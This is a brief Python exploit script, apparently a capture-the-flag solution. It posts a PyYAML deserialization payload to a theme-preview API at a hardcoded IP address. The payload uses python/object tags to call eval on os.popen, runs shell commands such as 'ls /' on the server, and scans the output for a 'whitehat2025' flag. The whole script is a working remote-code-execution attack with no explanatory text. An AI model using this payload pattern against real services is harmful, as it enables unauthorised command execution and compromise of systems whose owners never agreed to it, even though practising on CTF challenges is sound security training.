import requests, re

u = "http://3.34.41.135/api/theme/preview"
h = {"Content-Type": "application/x-yaml"}

def x(cmd):
    p = f"""!!python/object/new:tuple
- !!python/object/new:map
  - !!python/name:eval
  - ["__import__('os').popen('{cmd}').read()"]
"""
    r = requests.post(u, headers=h, data=p, timeout=10).json()
    if r.get("ok") and r["ok"] != "None":
        m = re.search(r"\('([^']*)'", str(r["ok"]))
        return m.group(1).replace('\\n', '\n') if m else r["ok"]

cmds = ["ls /"]

for c in cmds:
    r = x(c)
    if r:
        print(r)
        f = re.search(r'whitehat2025\{[^}]+\}', r)
        if f:
            print(f.group(0))
            break
